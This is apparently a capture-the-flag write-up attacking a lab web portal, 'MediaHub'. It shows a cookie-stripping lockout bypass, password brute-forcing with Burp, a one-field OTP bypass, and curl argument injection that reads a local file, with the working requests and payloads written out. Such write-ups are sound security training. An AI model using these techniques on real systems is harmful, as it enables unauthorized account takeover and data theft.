#Interceptor

**Target:** MediaHub — an internal media portal used by journalists/editors to manage content and publishing.

---

## 1. Reconnaissance

### Nmap scan

```bash
nmap -sV -sC <target_ip>
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MediaHub
| http-cookie-flags:
|   PHPSESSID: httponly flag not set
```

Two things stand out immediately:

- **`HttpOnly` not set** on `PHPSESSID`. On its own this isn't exploitable — it just means JavaScript *can* read the cookie via `document.cookie`. It's a precondition for cookie theft via XSS, not a vulnerability by itself. Worth remembering, not yet actionable.
- BIND is running on 53, which is worth checking for a misconfigured zone transfer (`AXFR`) — but the app has no discoverable domain name (it's only ever reached by raw IP), so that lead went nowhere.

### Browsing the site

The homepage and `login.php` are static; the login form itself is just UI. Reading the page source shows the real logic lives server-side:

```js
const res = await fetch("api_login.php", {
  method: "POST",
  body: payload   // FormData: email, password
});
```

---

## 2. Bypassing the Login Rate Limiter

Repeated login attempts through Burp quickly returned:

```json
{"ok":false,"error":"Too many login attempts."}
```

Since the app is otherwise stateless pre-login, the only thing identifying a "client" between requests is the `PHPSESSID` cookie. **Deleting the `Cookie` header entirely** before forwarding the request resets the counter — the server issues a brand-new session with a clean attempt count:

```
Set-Cookie: PHPSESSID=<new_session>; path=/
{"ok":false,"error":"Invalid credentials."}
```

This confirmed the lockout is session-scoped and trivially bypassable by stripping the cookie on every attempt.

### Ruling out other login weaknesses

A few other angles were tested and ruled out before moving on:

1. **Extra parameters** (`role=admin`) added to the multipart body — ignored by the backend.
2. **PHP type juggling** (`password[]` / `email[]` sent as arrays instead of strings, hoping to break a loose `==`/`strcmp()` comparison) — no effect.
3. **Classic SQL injection** (`'` in the `email` field) — returned a clean `"Invalid credentials."` rather than a syntax error, indicating parameterized queries / proper escaping.

**Conclusion:** the login logic itself is solid. The weak point in this app is elsewhere.

---

## 3. Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 40
```

The server returns **HTTP 200 for every path**, even nonexistent ones (a soft/custom 404), which floods gobuster with false positives. Fixing this required filtering out the catch-all page by its fixed response length:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 40 --exclude-length 1491
```

Notable results:

```
/uploads              (Status: 301)
/phpmyadmin           (Status: 301)
/login.php            (Status: 200)
/config.php           (Status: 200) [Size: 0]
```

- `phpMyAdmin` was reachable but login failed (`Access denied` for `root`, no known password) — a dead end without further creds.
- `/uploads/` had directory listing enabled, exposing `avatar_1_<hash>.png` — evidence of a profile-picture upload feature elsewhere in the (authenticated) app.
- `config.php` returned a blank body, as expected — PHP files execute server-side, so requesting them directly never reveals source.

### The real find: a leaked backup file

A second gobuster pass targeting backup/source-leak extensions turned up the jackpot:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt \
  -x php.bak,sql,bak,js.bak,log,tar.gz,zip -t 40 --exclude-length 1491
```

```
/login.php.bak        (Status: 200) [Size: 2038]
```

`.bak` files aren't handled by the PHP interpreter, so the server serves the **raw source code** instead of executing it:

```bash
curl http://<target_ip>/login.php.bak
```

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
?>
```

A leftover developer comment discloses:

- **Email:** `admin@mediahub.thm`
- **Password format:** `MediaHub` + a year

---

## 4. Initial Access — Brute-Forcing the Password with Burp Intruder

With the credential format known, the guess space is tiny (a handful of plausible years). Using Burp Intruder:

- Base request: `email=admin@mediahub.thm`, `password=§MediaHub2023§` (sniper position on the password value).
- **Cookie header removed** from the base request, so the earlier lockout bypass applies across the whole attack.
- Payload list: `MediaHub2020` – `MediaHub2026`.

| Payload | Length | Result |
|---|---|---|
| MediaHub2021/24/25 | 406 | Invalid credentials |
| MediaHub2022/2020/2023 | 407 | Invalid credentials |
| **MediaHub2026** | **436** | **Different — login succeeded** |

The odd-length response confirmed the hit:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

The response also issued a **new session cookie**, now tied to a "password verified, awaiting OTP" state.

---

## 5. Privilege Boundary — Bypassing Two-Factor Verification

Visiting `dashboard.php` directly with the new session cookie (skipping OTP) correctly redirected back — the server checks OTP-verified state server-side, not just session presence. So the OTP step needed to be dealt with properly.

`otp.php` posts to `verify_otp.php` with a single field, `otp` (6-digit numeric).

**Rate-limit test:** 11 consecutive wrong OTP submissions using the same session all returned the same clean error with no lockout:

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

This meant the OTP endpoint had **no brute-force protection at all** — a genuine, exploitable weakness (6-digit OTP = up to 1,000,000 combinations, freely retryable).

### The actual bypass: a missing-parameter logic flaw

Before committing to a full brute-force, a cheaper test was tried first: renaming the POST field from `otp` to `is_verified=true` (the same class of test as the earlier `role=admin` guess):

```
Content-Disposition: form-data; name="is_verified"

true
```

Response:

```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

This worked — sending no `otp` value at all caused the server's verification check to pass, rather than fail closed. Visiting `dashboard.php` afterward with the same session confirmed the server-side flag had genuinely flipped, not just the JSON response.

**Flag 1:** `THM{ADMIN_ACCESS_USING_BURP}`

---

## 6. Flag 2 — Local File Read via Shell Command Injection

The admin dashboard exposes:

- **Change Profile Picture** (uploads to `/uploads/`)
- **Import Feed** — "Paste a valid RSS/Atom feed URL. The server fetches it and returns the raw output."

"Import Feed" was the obvious candidate for the second flag (`/var/www/user.txt`).

### Filter bypass attempts

| Payload | Result |
|---|---|
| `file:///var/www/user.txt` | `"Only http/https allowed"` — scheme-restricted |
| `http://127.0.0.1/../../../../var/www/user.txt` | `"Private network access blocked"` — resolves hostname and blocks private IP ranges, not just string matching |
| `http://127.0.0.1.nip.io/../../../../var/www/user.txt` | Same block — confirms resolution happens before the IP check, defeating DNS-rebinding-style tricks |

### The real vulnerability: shell command injection via `curl`

Inspecting the page's JavaScript revealed the fetch response includes a field called `cmd_output`:

```js
if (data.cmd_output) {
  extra = `<div ...>${escapeHtml(data.cmd_output)}</div>`;
}
```

This strongly suggested the backend isn't using a native PHP HTTP function, but shelling out directly, e.g.:

```php
$output = shell_exec("curl " . $url);
```

**Attempt 1 — classic command chaining:**

```
www.example.com; cat /var/www/user.txt
```

Failed — curl's error output showed it treating `cat` and `/var/www/user.txt` as two more (malformed) URLs, meaning the `;` was neutralized rather than removed. This is consistent with PHP's `escapeshellcmd()`, which escapes shell metacharacters (`;`, `&`, `|`, backticks) with a backslash rather than stripping them, while leaving spaces untouched — so the shell still split the string into multiple space-separated arguments for `curl`.

**Attempt 2 — abuse curl's own multi-target / `file://` support:**

Rather than fighting the escaping, the same "multiple space-separated arguments" behavior that broke attempt 1 was turned into the exploit: `curl` accepts more than one URL on its command line, and it natively understands the `file://` scheme.

```
http://www.example.com; file:///var/www/user.txt
```

This value still starts with `http://`, so it passes the application's own scheme check, and it contains no *blocked* private IP. When `shell_exec("curl " . $url)` runs, curl receives what looks like two separate targets and fetches both — the first attempt at `example.com` times out (no internet from the box), but the second is read straight off the local filesystem via `file://`:

```json
{
  "ok": true,
  "message": "Feed fetched successfully",
  "cmd_output": "...curl: (28) Connection timed out...\nTHM{SYSTEM_PWNED_SUCCESSFULLY}\n"
}
```

**Flag 2:** `THM{SYSTEM_PWNED_SUCCESSFULLY}`

---

## Vulnerability Chain

| # | Vulnerability | Impact |
|---|---|---|
| V1 | `HttpOnly` not set on session cookies | Precondition for cookie theft via XSS (not directly exploited here, but a real weakness) |
| V2 | Session-scoped login lockout, resettable by discarding the cookie | No real rate limit on password guessing |
| V3 | `.bak` backup file left on the public web root | Leaked a developer comment disclosing the admin credential format |
| V4 | OTP verification trusted a client-suppliable field instead of checking a real OTP | Full 2FA bypass with a single crafted request |
| V5 | URL fetch feature validated the string but passed it unsanitized into a shell command | Local file disclosure via `curl`'s own multi-target / `file://` handling |

**General lesson:** almost every step in this room came from the same pattern — the backend validated or authenticated based on **something the client provided**, rather than deriving trust from data it controls itself. A rate limit tied to a discardable cookie, an OTP status tied to a client-suppliable field, and a URL filter that inspects the string but not what the underlying command actually does with it are all variations on the same root issue: **never trust client input to represent server-side state.**
